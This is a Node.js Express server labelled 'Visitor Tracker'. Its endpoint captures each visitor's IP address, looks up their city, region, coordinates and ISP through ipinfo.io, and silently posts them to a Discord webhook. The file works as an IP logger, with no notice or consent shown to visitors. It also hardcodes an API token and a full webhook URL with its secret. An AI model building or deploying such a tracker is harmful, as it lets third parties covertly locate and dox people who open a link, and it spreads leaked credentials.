const express = require('express');
const axios = require('axios');
const dotenv = require('dotenv');

dotenv.config();
const app = express();
const port = process.env.PORT || 3000;

// Middleware to handle JSON requests
app.use(express.json());

// Serve static files (like HTML)
app.use(express.static('public'));

app.get('/get-ip', async (req, res) => {
    // Get visitor's IP address
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const apiUrl = `https://ipinfo.io/${visitorIp}/json?token=88ee1b75799078`;

    try {
        // Fetch location data from ipinfo.io
        const response = await axios.get(apiUrl);
        const locationData = response.data;

        // Send IP and location data to Discord
        await sendToDiscord(visitorIp, locationData);

        // Respond with IP and location data
        res.json({
            success: true,
            ip: visitorIp,
            location: locationData,
        });
    } catch (error) {
        console.error('Error fetching location:', error);
        res.status(500).json({ success: false, message: 'Error fetching location' });
    }
});

// Function to send message to Discord webhook
async function sendToDiscord(ip, locationData) {
    const webhookUrl = "https://discord.com/api/webhooks/1220099844954132513/8MCYbxGzK81nX3O7h8As78niQ0Rvv5VSbxGA5cQX8VXQPAjkIYwjq8WP08vRoljTQvgp";
    ;

    const embed = {
        title: 'New Visitor IP',
        fields: [
            { name: 'IP Address', value: ip, inline: true },
            { name: 'City', value: locationData.city || 'N/A', inline: true },
            { name: 'Region', value: locationData.region || 'N/A', inline: true },
            { name: 'Country', value: locationData.country || 'N/A', inline: true },
            { name: 'Location', value: locationData.loc || 'N/A', inline: true },
            { name: 'ISP', value: locationData.org || 'N/A', inline: true },
        ],
        footer: {
            text: 'Visitor Tracker',
        },
    };

    await axios.post(webhookUrl, { embeds: [embed] });
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});